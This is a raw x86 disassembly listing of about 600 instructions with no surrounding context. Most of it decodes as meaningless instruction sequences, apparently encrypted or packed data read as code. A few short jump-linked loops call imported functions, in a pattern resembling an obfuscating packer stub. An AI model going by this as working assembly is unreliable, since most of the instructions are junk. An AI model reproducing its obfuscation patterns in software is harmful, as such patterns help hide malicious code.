  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434425,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi+0x841b7f9]
  407b18:	xor    eax,ebx
  407b1a:	push   esp
  407b1b:	int3   
  407b1c:	jo     0x407b8e
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0x595e5870
  407b25:	nop
  407b26:	dec    edx
  407b27:	loopne 0x407b2a
  407b29:	mov    esi,0x652c015f
  407b2e:	cld    
  407b2f:	mov    dl,0xaf
  407b31:	test   eax,0x166e77ac
  407b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b37:	in     eax,dx
  407b38:	test   eax,0xb047de5f
  407b3d:	pop    ss
  407b3e:	xor    BYTE PTR [edx],al
  407b40:	iret   
  407b41:	xor    dh,BYTE PTR [ebx+eax*1]
  407b44:	adc    DWORD PTR [edi],ecx
  407b46:	xchg   edi,eax
  407b47:	pop    eax
  407b48:	cwde   
  407b49:	ss inc esi
  407b4b:	retf   
  407b4c:	xchg   edx,eax
  407b4d:	inc    esp
  407b4e:	fcom   DWORD PTR [ebx]
  407b50:	or     BYTE PTR [ebx],cl
  407b52:	mov    ebp,0xdab14fbe
  407b57:	push   esp
  407b58:	fcom   st(2)
  407b5a:	or     BYTE PTR [edx-0x6d],ah
  407b5d:	or     DWORD PTR [esi-0x42],ecx
  407b60:	inc    esi
  407b61:	arpl   WORD PTR [edi],dx
  407b63:	fwait
  407b64:	pusha  
  407b65:	adc    al,dh
  407b67:	repnz loop 0x407b49
  407b6a:	mov    ds:0x47bc3ab2,al
  407b6f:	mov    al,BYTE PTR [ecx]
  407b71:	sub    eax,edi
  407b73:	sub    BYTE PTR [ecx+ebx*4],bh
  407b76:	pop    ebp
  407b77:	cmp    BYTE PTR [edx],0x73
  407b7a:	ins    DWORD PTR es:[edi],dx
  407b7b:	hlt    
  407b7c:	sti    
  407b7d:	pop    ecx
  407b7e:	jle    0x407ba1
  407b80:	and    al,0xeb
  407b82:	nop
  407b83:	fcmovnb st,st(2)
  407b85:	clc    
  407b86:	cmp    bh,cl
  407b88:	lods   eax,DWORD PTR ds:[esi]
  407b89:	sbb    ebp,DWORD PTR ds:0xea19b35f
  407b8f:	retf   
  407b90:	add    BYTE PTR [ecx+0x153bdfc4],bl
  407b96:	or     BYTE PTR [ecx-0x5222b7bc],ch
  407b9c:	inc    edi
  407b9d:	jo     0x407bff
  407b9f:	xchg   ebx,eax
  407ba0:	xor    al,BYTE PTR [ecx]
  407ba2:	ret    0xc341
  407ba5:	call   0xe5e40cbc
  407baa:	mov    al,ds:0x12def78c
  407baf:	les    esp,FWORD PTR [esp+ebx*1]
  407bb2:	xor    DWORD PTR [ebx],eax
  407bb4:	dec    ebx
  407bb5:	retf   0x1cca
  407bb8:	nop
  407bb9:	(bad)  
  407bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bbb:	cmp    edx,DWORD PTR [edi-0x371f2d4f]
  407bc1:	inc    esi
  407bc2:	push   ebp
  407bc3:	mov    ?,WORD PTR [ebx+0x56]
  407bc6:	add    dl,dl
  407bc8:	jae    0x407c1e
  407bca:	int    0x74
  407bcc:	jmp    0x52cba0
  407bd1:	cwde   
  407bd2:	out    dx,al
  407bd3:	cld    
  407bd4:	pop    eax
  407bd5:	jecxz  0x407b81
  407bd7:	nop    DWORD PTR ds:0xa96e0cb5
  407bde:	pop    edi
  407bdf:	mov    WORD PTR [ecx+0x72179760],es
  407be5:	push   ebp
  407be6:	ja     0x407be6
  407be8:	push   ebx
  407be9:	int    0xb5
  407beb:	ja     0x407c0d
  407bed:	sub    al,0xc8
  407bef:	fs adc ah,bh
  407bf2:	and    edx,0xffffffc6
  407bf5:	in     eax,dx
  407bf6:	push   ebp
  407bf7:	mov    dl,0x57
  407bfa:	and    dl,BYTE PTR [esi]
  407bfc:	adc    DWORD PTR [esi-0x62],edx
  407bff:	jno    0x407ba5
  407c01:	mul    bl
  407c03:	xchg   edi,eax
  407c04:	stos   BYTE PTR es:[edi],al
  407c05:	loop   0x407b9f
  407c07:	(bad)  
  407c08:	xchg   edi,eax
  407c09:	and    al,0x88
  407c0b:	push   0xd8b2d2f7
  407c10:	mov    ebp,0x260efc9f
  407c15:	les    esp,FWORD PTR [ebx]
  407c17:	lods   eax,DWORD PTR ds:[esi]
  407c18:	scas   al,BYTE PTR es:[edi]
  407c19:	inc    esi
  407c1a:	ret    
  407c1b:	and    DWORD PTR [edi+0x42],ebp
  407c1e:	inc    esi
  407c1f:	sub    BYTE PTR [esi],ch
  407c21:	iret   
  407c22:	mov    eax,ds:0xdb351ef7
  407c27:	mov    ch,BYTE PTR [ebp+0x33f5033e]
  407c2d:	push   ebx
  407c2e:	mov    edx,0x222659fd
  407c33:	aad    0xc8
  407c35:	leave  
  407c36:	adc    BYTE PTR [ecx-0x1272e8b3],al
  407c3c:	sahf   
  407c3d:	xchg   BYTE PTR [ecx+0x788e32ba],dh
  407c43:	sub    DWORD PTR ds:[eax],esp
  407c46:	xchg   DWORD PTR [eax+0x6a],eax
  407c49:	mov    eax,0xb090cd98
  407c4e:	sbb    edi,DWORD PTR [esi+0x79]
  407c51:	mov    edi,?
  407c53:	das    
  407c54:	mov    ch,0xfa
  407c56:	fcom   DWORD PTR [ecx-0x5]
  407c59:	dec    edx
  407c5a:	pop    esp
  407c5b:	pop    ebx
  407c5c:	inc    ebx
  407c5d:	jo     0x407cc0
  407c5f:	mov    edi,0x857311c7
  407c64:	dec    ebx
  407c65:	sub    ecx,DWORD PTR [esi+0x1d]
  407c68:	outs   dx,DWORD PTR ds:[esi]
  407c69:	retf   0xd7e0
  407c6c:	xor    eax,0x6a48c3f9
  407c71:	and    ah,BYTE PTR [ebx-0x3]
  407c74:	inc    ecx
  407c75:	call   0xdbc02699
  407c7a:	mov    ebx,DWORD PTR [ebp+0x36a310a4]
  407c80:	sub    al,0x74
  407c82:	arpl   WORD PTR [esi],cx
  407c84:	inc    eax
  407c85:	(bad)  
  407c86:	aaa    
  407c87:	cmp    BYTE PTR [ebx+ebp*8-0x33],ch
  407c8b:	xor    bl,BYTE PTR [edx-0xa504521]
  407c91:	mov    bl,0x3d
  407c93:	xor    eax,0x6eba1011
  407c98:	dec    edx
  407c99:	leave  
  407c9a:	ins    DWORD PTR es:[edi],dx
  407c9b:	sbb    bl,BYTE PTR [edx+eax*8+0x54bd1f17]
  407ca2:	and    eax,0xb2e9d794
  407ca7:	jae    0x407c8a
  407ca9:	sub    eax,0x9966ed45
  407cae:	lahf   
  407caf:	dec    esp
  407cb0:	bswap  eax
  407cb2:	dec    edi
  407cb3:	retf   
  407cb4:	scas   eax,DWORD PTR es:[edi]
  407cb5:	adc    al,0x6b
  407cb7:	cmc    
  407cb8:	ret    
  407cb9:	mov    ebx,DWORD PTR [ebp-0x1c]
  407cbc:	pop    es
  407cbd:	add    ch,BYTE PTR [ebp+0x75f0a4c3]
  407cc3:	pop    ebp
  407cc4:	in     eax,dx
  407cc5:	dec    esp
  407cc6:	repz aas 
  407cc8:	xchg   DWORD PTR [ebx],ecx
  407cca:	mov    WORD PTR [edx],cs
  407ccc:	dec    eax
  407ccd:	add    cl,BYTE PTR [esi]
  407ccf:	add    edi,0x89d4dfd1
  407cd5:	jecxz  0x407d2b
  407cd7:	or     BYTE PTR [ebp-0x57263727],ah
  407cdd:	fsub   st(4),st
  407cdf:	in     al,dx
  407ce0:	inc    esp
  407ce1:	in     eax,0x38
  407ce3:	mov    ss,ebx
  407ce5:	push   es
  407ce6:	sbb    BYTE PTR [esi+0x6e3aee67],0x39
  407ced:	out    dx,eax
  407cee:	inc    esi
  407cef:	fisub  WORD PTR [edx+ebx*2-0x6f0906b9]
  407cf6:	and    al,0x99
  407cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cf9:	fcomp  QWORD PTR [eax]
  407cfb:	aas    
  407cfc:	and    al,0x9b
  407cfe:	pop    es
  407cff:	outs   dx,BYTE PTR ds:[esi]
  407d00:	ffree  st(3)
  407d02:	(bad)  
  407d04:	mov    edi,0x4d60c283
  407d09:	pop    edx
  407d0a:	mov    dh,0x68
  407d0c:	daa    
  407d0d:	mov    ecx,0xf5d850b7
  407d12:	daa    
  407d13:	scas   al,BYTE PTR es:[edi]
  407d14:	mov    dh,0x7b
  407d16:	popf   
  407d17:	fs sbb edi,eax
  407d1a:	inc    ebp
  407d1b:	les    edi,FWORD PTR [esi]
  407d1d:	test   DWORD PTR [eax+edi*8+0x438e05c7],ebx
  407d24:	inc    ebx
  407d25:	add    BYTE PTR [edx],bl
  407d27:	add    BYTE PTR [eax],al
  407d29:	add    BYTE PTR [ebx+0x43438e3d],al
  407d2f:	add    BYTE PTR [eax],al
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43438e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4329ce
  407d4c:	cmp    DWORD PTR ds:0x43438e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43438e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43438e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43438e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43438e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432dce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43439a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [edx+0x4d7d7cef],al
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0x8c983e70
  407db0:	xor    ebx,DWORD PTR [esi-0x27]
  407db3:	rcl    DWORD PTR [edx+ecx*1],0x53
  407db7:	rcl    DWORD PTR [esi+0x135cc983],0xb4
  407dbe:	xchg   ecx,eax
  407dbf:	push   eax
  407dc0:	sub    BYTE PTR [esi+0x41],al
  407dc3:	cdq    
  407dc4:	push   ebx
  407dc5:	icebp  
  407dc6:	div    BYTE PTR [edx+0x7cc5bd5e]
  407dcc:	dec    eax
  407dcd:	lock in eax,dx
  407dcf:	or     ecx,edi
  407dd1:	mov    al,ds:0x58c1fb6e
  407dd6:	mov    esi,DWORD PTR [ebx-0x2e]
  407dd9:	dec    ecx
  407dda:	fs sub edi,ebp
  407ddd:	xchg   ebp,eax
  407dde:	in     al,dx
  407ddf:	lods   eax,DWORD PTR ds:[esi]
  407de0:	or     esp,DWORD PTR [ebx-0x623a2a25]
  407de6:	out    0x97,al
  407de8:	sbb    bl,BYTE PTR [ebp+0x5c946231]
  407dee:	mov    eax,ds:0x3183a897
  407df3:	sbb    edi,DWORD PTR [eax-0x7540938e]
  407df9:	mov    bh,0x5d
  407dfb:	adc    DWORD PTR [esi],eax
  407dfd:	mov    fs,WORD PTR [esi-0x1c]
  407e00:	inc    esp
  407e01:	xchg   BYTE PTR [edx-0x4c],ch
  407e04:	test   eax,0xad22fa9a
  407e09:	test   al,0xc
  407e0b:	icebp  
  407e0c:	sbb    al,0x91
  407e0f:	push   edi
  407e10:	sbb    DWORD PTR [eax],eax
  407e12:	(bad)  
  407e13:	rcl    BYTE PTR [edi-0x45],cl
  407e16:	leave  
  407e17:	mov    ecx,0xe81954f9
  407e1c:	xchg   edx,eax
  407e1d:	xchg   esi,eax
  407e1e:	push   eax
  407e1f:	div    ch
  407e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e22:	adc    eax,0xeecf52a9
  407e27:	aad    0xa5
  407e29:	mov    dl,0xbc
  407e2b:	das    
  407e2c:	imul   ebx,DWORD PTR [edx*8-0x744f1f67],0xa
  407e34:	icebp  
  407e35:	push   ebp
  407e36:	cdq    
  407e37:	mov    ds:0xbed45f92,al
  407e3c:	add    DWORD PTR [edx+0x7],esp
  407e3f:	mov    eax,0x300402ed
  407e44:	int    0xaa
  407e46:	imul   DWORD PTR [ecx]
  407e48:	cwde   
  407e49:	push   eax
  407e4a:	rcl    ebx,1
  407e4c:	fcos   
  407e4e:	adc    dl,BYTE PTR [esp+ebx*1]
  407e51:	loop   0x407e6b
  407e53:	and    DWORD PTR [ebx+edi*4],ecx
  407e56:	mov    dh,0xd8
  407e58:	mov    esp,0xd0d72c30
  407e5d:	je     0x407e30
  407e5f:	in     eax,dx
  407e60:	lods   eax,DWORD PTR ds:[esi]
  407e61:	nop    DWORD PTR [edx-0x40]
  407e65:	inc    edi
  407e66:	xchg   edi,eax
  407e67:	scas   eax,DWORD PTR es:[edi]
  407e68:	add    ch,BYTE PTR [eax+ebp*1]
  407e6b:	pop    esi
  407e6c:	outs   dx,DWORD PTR ds:[esi]
  407e6d:	xlat   BYTE PTR ds:[ebx]
  407e6e:	fnstenv [edx+0x45]
  407e71:	outs   dx,DWORD PTR ds:[esi]
  407e72:	jge    0x407ebf
  407e74:	push   ecx
  407e75:	out    dx,eax
  407e76:	or     al,BYTE PTR gs:[ecx+0x46]
  407e7a:	pop    ss
  407e7b:	dec    ebx
  407e7c:	jbe    0x407ed2
  407e7e:	jb     0x407e5f
  407e80:	xor    al,0xec
  407e82:	(bad)  
  407e83:	pop    edi
  407e84:	cli    
  407e85:	add    DWORD PTR [ebx],eax
  407e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e88:	mov    edx,0x9f4e3af8
  407e8d:	cmovb  esi,DWORD PTR [eax-0x24ad87e9]
  407e94:	or     DWORD PTR [eax],0xffffffd3
  407e97:	sbb    ah,BYTE PTR [ecx+0x54]
  407e9a:	(bad)  
  407e9b:	test   ch,0x34
  407e9e:	loopne 0x407eee
  407ea0:	push   esi
  407ea1:	xchg   edx,eax
  407ea2:	mov    dl,0x4e
  407ea4:	add    DWORD PTR [ecx+0x66277521],0xffffffdb
  407eab:	add    esp,DWORD PTR [edx]
  407ead:	ins    DWORD PTR es:[edi],dx
  407eae:	fidivr WORD PTR [ebp-0x624a42ad]
  407eb4:	mov    DWORD PTR [ebx+0x190346e3],eax
  407eba:	repz xor al,0x1e
  407ebd:	dec    edi
  407ebe:	xchg   ebp,eax
  407ebf:	outs   dx,DWORD PTR ds:[esi]
  407ec0:	push   ds
  407ec1:	loopne 0x407f2f
  407ec3:	jp     0x407ed3
  407ec5:	loop   0x407f20
  407ec7:	hlt    
  407ec8:	xchg   ebx,eax
  407ec9:	call   0x6bbf96dd
  407ece:	outs   dx,BYTE PTR ds:[esi]
  407ecf:	in     al,dx
  407ed0:	scas   al,BYTE PTR es:[edi]
  407ed1:	mov    esi,0xa3a3cbdc
  407ed6:	jb     0x407efb
  407ed8:	jnp    0x407ee5
  407eda:	mov    ecx,0x79796e9d
  407edf:	sub    DWORD PTR [eax+0x68],edx
  407ee2:	mov    cl,BYTE PTR [ebx+0x5c231f9c]
  407ee8:	push   0xffffffc0
  407eea:	xor    BYTE PTR [edx],bl
  407eec:	jno    0x407f01
  407eee:	sbb    al,BYTE PTR [edx+0x36]
  407ef1:	sub    al,0x56
  407ef3:	cmp    esi,DWORD PTR [edi+0x54]
  407ef6:	inc    ecx
  407ef7:	lahf   
  407ef8:	out    0x46,eax
  407efa:	outs   dx,BYTE PTR ds:[esi]
  407efb:	aam    0xf5
  407efd:	push   ds
  407efe:	cmc    
  407eff:	out    dx,eax
  407f00:	mov    bh,0xf6
  407f02:	jl     0x407f05
  407f04:	xor    BYTE PTR [ebx],bh
  407f06:	mov    cl,BYTE PTR [ebp-0x4685c63e]
  407f0c:	loop   0x407f56
  407f0e:	fwait
  407f0f:	adc    al,0x85
  407f11:	cmp    DWORD PTR [eax],eax
  407f13:	and    edx,eax
  407f15:	pop    eax
  407f16:	and    edx,DWORD PTR [edi+ecx*1-0x66c7b7c8]
  407f1d:	add    cl,BYTE PTR [edi+0x63]
  407f20:	add    edx,DWORD PTR ds:0x392bb19e
  407f26:	aam    0x66
  407f28:	pusha  
  407f29:	adc    DWORD PTR [eax+0x3b],0x33b8e3a1
  407f30:	add    al,0x25
  407f32:	xchg   edi,eax
  407f33:	push   cs
  407f34:	inc    ebx
  407f35:	cdq    
  407f36:	into   
  407f37:	(bad)  
  407f38:	mov    esp,0x53196705
  407f3d:	mov    dh,0xb8
  407f3f:	sbb    ah,BYTE PTR [edi+0x5a2d83af]
  407f45:	jmp    0x407ed6
  407f47:	imul   edx,DWORD PTR [edx],0xce499641
  407f4d:	mov    al,ds:0x4eacf983
  407f52:	adc    dl,BYTE PTR [ebx]
  407f54:	jbe    0x407edb
  407f56:	push   eax
  407f57:	adc    DWORD PTR [edx+0x3a],ebp
  407f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f5b:	(bad)  
  407f5d:	push   0xffffffe7
  407f5f:	sub    cl,BYTE PTR [esi-0xeeabb9e]
  407f65:	pop    edi
  407f66:	fimul  WORD PTR [esi+0x2]
  407f69:	icebp  
  407f6a:	data16 loop 0x407eed
  407f6d:	ret    0xeda7
  407f70:	ret    
  407f71:	fistp  QWORD PTR [edi+0x580c5971]
  407f77:	loopne 0x407f54
  407f79:	hlt    
  407f7a:	out    0xa6,al
  407f7c:	add    BYTE PTR ds:0x9c8920f7,ch
  407f82:	idiv   edx
  407f84:	jmp    0x3179:0x9a758f37
  407f8b:	dec    ecx
  407f8c:	pop    ecx
  407f8d:	sahf   
  407f8e:	jl     0x407f14
  407f90:	push   cs
  407f91:	jmp    0x40800f
  407f93:	jg     0x407fbe
  407f95:	sti    
  407f96:	dec    edi
  407f97:	scas   eax,DWORD PTR es:[edi]
  407f98:	addr16 pop ds
  407f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9b:	cmp    eax,0xa5df4d3d
  407fa0:	aam    0xc7
  407fa2:	sub    DWORD PTR [edi+ecx*1],eax
  407fa5:	test   BYTE PTR [ecx+0x1d],cl
  407fa8:	add    BYTE PTR [eax],al
  407faa:	push   ebx
  407fab:	mov    DWORD PTR ds:0x43437a,0x643a
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432708,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43438a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43438a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43438a,edi
  407fe5:	cmp    DWORD PTR ds:0x43438a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43438a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432c3e
  40800a:	cmp    DWORD PTR ds:0x43438a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43438a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43438a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43439e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	jg     0x40808d
  408045:	xchg   ecx,eax
  408046:	mov    bl,0x46
  408048:	enter  0x7070,0x69
  40804c:	jg     0x4080be
  40804e:	jo     0x407fdc
  408050:	pushf  
  408051:	pop    eax
  408052:	adc    ah,ah
  408054:	loop   0x408077
  408056:	sbb    BYTE PTR [edi+ecx*1],0x77
  40805a:	cli    
  40805b:	cli    
  40805c:	push   eax
  40805d:	jnp    0x407fe3
  40805f:	rol    al,1
  408061:	cmp    ah,0x44
  408064:	dec    eax
  408065:	mov    esp,0x53fa2df2
  40806a:	inc    ebp
  40806b:	lods   al,BYTE PTR ds:[esi]
  40806c:	jbe    0x408040
  40806e:	or     esi,DWORD PTR [edx-0x19]
  408071:	xchg   ebx,eax
  408072:	add    DWORD PTR [edi+0x7b],esp
  408075:	sbb    al,0xcd
  408077:	adc    ebp,eax
  408079:	inc    esp
  40807a:	cmp    dh,BYTE PTR [ecx+eax*1]
  40807d:	hlt    
  40807e:	(bad)  
  40807f:	(bad)  
  408080:	ins    BYTE PTR es:[edi],dx
  408081:	sub    ecx,DWORD PTR [edi-0x3a591d53]
  408087:	push   es
  408088:	and    al,0x4c
  40808a:	das    
  40808b:	push   eax
  40808c:	jl     0x408040
  40808e:	cdq    
  40808f:	outs   dx,DWORD PTR ds:[esi]
  408090:	mov    edx,0xee6c38a9
  408095:	loope  0x408088
  408097:	test   edx,edx
  408099:	test   al,0x1d
  40809b:	push   ss
  40809c:	es mov edx,0x3cd4a7d0
  4080a2:	jl     0x4080de
  4080a4:	loop   0x408110
  4080a6:	test   BYTE PTR [eax],dl
  4080a8:	push   esi
  4080a9:	sub    al,dl
  4080ab:	ins    BYTE PTR es:[edi],dx
  4080ac:	or     ch,BYTE PTR [edi+0x1d71098b]
  4080b2:	test   BYTE PTR [edi+ebp*2-0x19],dl
  4080b6:	ins    DWORD PTR es:[edi],dx
  4080b7:	rcr    BYTE PTR [esi+0x7b],0x7a
  4080bb:	and    BYTE PTR [edx-0x67],ah
  4080be:	or     BYTE PTR [edi+0x59],ch
  4080c1:	inc    edx
  4080c2:	iret   
  4080c3:	xor    bl,al
  4080c5:	xor    ecx,ebx
  4080c7:	bound  ebx,QWORD PTR [ebp+0x45]
  4080ca:	or     eax,edi
  4080cc:	lea    ebp,[ebx+0x49]
  4080cf:	add    BYTE PTR [ecx+edx*2],ch
  4080d2:	sub    eax,0xbf22a21a
  4080d7:	cld    
  4080d8:	sbb    al,0x35
  4080da:	mov    cl,BYTE PTR [ebx]
  4080dc:	nop
  4080dd:	sub    dh,BYTE PTR [edi+0x23]
  4080e0:	push   ebp
  4080e1:	jecxz  0x408157
  4080e3:	cmp    BYTE PTR [ecx-0x1b5287cd],dh
  4080e9:	rcr    DWORD PTR [esp+ebp*2-0xb8f5e68],cl
  4080f0:	pusha  
  4080f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080f2:	and    al,0x9d
  4080f4:	push   es
  4080f5:	mov    dl,0x5d
  4080f7:	test   esi,0x7b7c43ca
  4080fd:	mov    ds:0x6adf0f0f,eax
  408102:	sbb    eax,0xb538714b
  408107:	or     dh,cl
  408109:	jns    0x408167
  40810b:	bound  esp,QWORD PTR [edi+0x21]
  40810e:	inc    edx
  40810f:	out    dx,eax
  408110:	sub    al,BYTE PTR [ecx]
  408112:	(bad)  
  408114:	mov    ecx,0xf5bbca28
  408119:	xor    dl,ch
  40811b:	jp     0x4080b3
  40811d:	out    0xc2,al
  40811f:	sar    ebx,1
  408121:	xchg   BYTE PTR [ebx+eax*1+0x19],bl
  408125:	xor    DWORD PTR [ebx-0x5382806b],ebx
  40812b:	pop    ss
  40812c:	rcl    DWORD PTR [edx-0x56],0x65
  408130:	lods   eax,DWORD PTR ds:[esi]
  408131:	outs   dx,BYTE PTR ds:[esi]
  408132:	loope  0x4080ed
  408134:	xor    BYTE PTR [ebp-0x48c2c6bc],bl
  40813a:	or     eax,0xa534aedc
  40813f:	jle    0x40815a
  408141:	add    eax,0x277aa4a
  408146:	mov    WORD PTR [eax],fs
  408148:	xchg   esi,eax
  408149:	cmp    eax,0xccdec6f6
  40814e:	dec    eax
  40814f:	pop    es
  408150:	in     al,0xf
  408152:	inc    ebp
  408153:	repnz arpl WORD PTR [esi+0x2],dx
  408157:	sub    BYTE PTR [esp+edi*1+0x26],dh
  40815b:	xchg   ebx,eax
  40815c:	scas   al,BYTE PTR es:[edi]
  40815d:	repz push ecx
  40815f:	push   edx
  408160:	push   esi
  408161:	dec    esp
  408162:	jb     0x40810d
  408164:	mov    eax,ds:0x30268447
  408169:	push   cs
  40816a:	lods   al,BYTE PTR ds:[esi]
  40816b:	test   esp,0xd04438f8
  408171:	test   DWORD PTR ds:0xfb78fecc,esi
  408177:	aas    
  408178:	pop    ebp
  408179:	sub    cl,0xa9
  40817c:	cmp    ah,BYTE PTR [ecx+0x29d8cda9]
  408182:	push   0xffffffea
  408184:	cmp    cl,bh
  408186:	xor    eax,0xaec4df86
  40818b:	mov    gs,WORD PTR [ecx-0x75]
  40818e:	xchg   edi,eax
  40818f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408190:	enter  0x53fe,0xc9
  408194:	jnp    0x408137
  408196:	pop    edi
  408197:	je     0x408214
  408199:	arpl   WORD PTR [esi],sp
  40819b:	iret   
  40819c:	xchg   DWORD PTR [esi-0x1d],edi
  40819f:	mov    bh,BYTE PTR [ecx]
  4081a1:	outs   dx,DWORD PTR ds:[esi]
  4081a2:	imul   ebp,ebx,0xc6017362
  4081a8:	mov    al,0xae
  4081aa:	xchg   edx,eax
  4081ab:	adc    ch,0x84
  4081ae:	add    eax,0x276b4210
  4081b3:	adc    eax,0x94472690
  4081b8:	pop    edx
  4081b9:	fld    st(6)
  4081bb:	sbb    DWORD PTR [eax],0x74
  4081be:	aad    0x72
  4081c0:	ret    
  4081c1:	lods   al,BYTE PTR ds:[si]
  4081c3:	adc    DWORD PTR [edi-0x6a46ab64],esp
  4081c9:	call   0x1a7e:0x7fc64f2d
  4081d0:	aam    0x17
  4081d2:	fnstenv [edx]
  4081d4:	aad    0x67
  4081d6:	xchg   DWORD PTR [ebx],edi
  4081d8:	fs push 0x6d
  4081db:	and    BYTE PTR [ebx],dh
  4081dd:	ret    0x1237
  4081e0:	jmp    0x456d:0xbfdf046b
  4081e7:	fmul   st(6),st
  4081e9:	or     eax,0xbc74bc4e
  4081ee:	jmp    0x731e01c2
  4081f3:	or     esp,eax
  4081f5:	and    al,0x37
  4081f7:	jl     0x408254
  4081f9:	push   esp
  4081fa:	hlt    
  4081fb:	and    BYTE PTR [ebp-0xb098691],bh
  408201:	sub    esp,esi
  408203:	test   bl,bl
  408205:	and    al,0x60
  408207:	mov    esp,DWORD PTR [edi]
  408209:	push   ebx
  40820a:	ins    DWORD PTR es:[edi],dx
  40820b:	ins    BYTE PTR es:[edi],dx
  40820c:	mov    cl,0x8b
  40820e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40820f:	mov    al,ds:0xc66315dd
  408214:	(bad)  
  408216:	add    bl,BYTE PTR [esi+0x2436f379]
  40821c:	mov    ah,0x92
  40821e:	sbb    eax,0x9f154271
  408223:	adc    eax,0xd628b381
  408228:	sar    DWORD PTR [ebx+0x5d44a2d3],1
  40822e:	es or  eax,0xe64713df
  408234:	xor    BYTE PTR [esi-0x3e],ch
  408237:	rol    BYTE PTR [eax+0x22],cl
  40823a:	jbe    0x408289
  40823c:	inc    esp
  40823d:	fbld   TBYTE PTR [eax+0x60]
  408240:	dec    edx
  408241:	sub    edi,DWORD PTR [esi+0x2baf933b]
  408247:	cli    
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432de2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434372,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434386,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408281:	sub    DWORD PTR [edi-0x51],esp
  408284:	mov    edi,0x697070d6
  408289:	jg     0x4082fb
  40828b:	jo     0x408244
  40828d:	push   ebp
  40828e:	aam    0x8f
  408290:	xor    BYTE PTR [esi],bl
  408292:	mov    ds:0x38c5a16,eax
  408297:	xor    eax,0x9197615
  40829c:	or     ch,bh
  40829e:	les    edi,FWORD PTR [edx]
  4082a0:	cmc    
  4082a1:	outs   dx,DWORD PTR ds:[esi]
  4082a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082a3:	dec    eax
  4082a4:	cld    
  4082a5:	fadd   st(3),st
  4082a7:	or     DWORD PTR [ebp+0x5155b4f],esi
  4082ad:	and    ch,ah
  4082af:	retf   
  4082b0:	fsin   
  4082b2:	push   ebp
  4082b3:	mov    bl,0xb7
  4082b5:	scas   al,BYTE PTR es:[edi]
  4082b6:	lea    edi,[edi]
  4082b8:	(bad)  
  4082b9:	out    dx,al
  4082ba:	cli    
  4082bb:	scas   al,BYTE PTR es:[edi]
  4082bc:	or     cl,ch
  4082be:	ja     0x408280
  4082c0:	push   0x48
  4082c2:	popf   
  4082c3:	int    0xb9
  4082c5:	inc    ecx
  4082c6:	jmp    0x408345
  4082c8:	jmp    0x40832c
  4082ca:	sar    DWORD PTR [edi-0x15],0x7d
  4082ce:	mov    cl,0x8f
  4082d0:	and    DWORD PTR [edx],0xa007cdba
  4082d6:	pop    ss
  4082d7:	jbe    0x408324
  4082d9:	adc    al,0x2f
  4082db:	test   al,0x90
  4082dd:	ret    
  4082de:	dec    esi
  4082df:	cdq    
